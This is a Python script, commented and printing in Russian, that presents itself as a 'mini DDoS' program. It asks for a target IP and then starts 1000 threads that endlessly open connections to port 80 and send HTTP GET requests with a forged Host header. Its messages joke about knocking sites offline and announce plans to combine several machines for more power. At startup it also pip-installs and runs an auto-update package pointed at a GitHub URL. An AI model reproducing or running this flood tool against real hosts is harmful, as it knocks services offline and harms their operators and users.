#version 3.0
#by SKATT
#remake 06.11.2023
print('version 2.0')
import os
os.system('pip install AutoUpdate')
import AutoUpdate
import socket
import threading
import time
print('Запуск программы...')
print('version 2.0')
print('created bySKATT')
time.sleep(1)
print('Проверка Обновлений')
print("данная функция пока тестируется")
AutoUpdate.set_url('https://github.com/POHel/mini-ddos-programm/edit/main/ddos.py')
AutoUpdate.set_current_version('2.0')
AutoUpdate.set_download_link("https://github.com/POHel/mini-ddos-programm/ddos.py")
print(AutoUpdate.is_up_to_date())
time.sleep(1)
print('Определяю OS...')
time.sleep(0.5)
print('Ваша ос: ', os.name)
time.sleep(2)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
print('created bySKATT')
print('version 2.0')
print('''
    !О БУДУЮЩИХ ОБНОВЛЕНИЯХ!
    В 3 версии хочу добавить пинг чтобы сразу в программе можно было проверить статус IP
    В 4 версии хочу сделать сервера и клиента для автоматизации запуска программы на всех имеющихся у вас машинах 
    (чтобы суммировать вычислительную мощность)
    А дальше можете предложить свою идею
    ''')
print('''
    Если возникают ошибки, то вот возможные причины:
    1)Плохое соединение с интернетом
    2)Некорректно введён IP адрес
    3)Сервер не может обработать ваши звпросы
    (это хорошо, кто не знает это означает что сервер начал лагать или же это 1 пункт)
    4)Возможно вы положили сайт :)
    (но это не точно)
    ''')
ip = input('введите IP: ')
fip = input('введите fake IP: ')
target = ip
fake_ip = fip
port = 80
attack_num = 1

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                                
        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()
for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
